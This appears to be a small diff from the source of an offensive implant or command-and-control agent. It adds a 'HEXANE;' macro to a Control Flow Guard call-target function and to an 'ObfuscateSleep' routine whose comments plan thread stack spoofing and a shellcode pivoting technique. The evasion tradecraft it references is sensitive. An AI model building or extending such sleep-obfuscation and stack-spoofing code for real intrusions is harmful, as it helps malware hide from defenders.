@@ -3,6 +3,7 @@ using namespace Utils::Time;
 using namespace Utils::Random;
 
 BOOL AddValidCallTarget(void* pointer) {
+    HEXANE;
 
     CFG_CALL_TARGET_INFO target_info = { };
     EXTENDED_PROCESS_INFORMATION ex_procinfo = { };
@@ -33,6 +34,7 @@ BOOL AddValidCallTarget(void* pointer) {
 BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 // TODO: finish and implement thread stack spoofing along side
 // TODO: modify with shubakki's pivoting technique: https://sillywa.re/posts/flower-da-flowin-shc/
+    HEXANE;
 
     bool success = true;
     Timeout(RandomSleepTime());
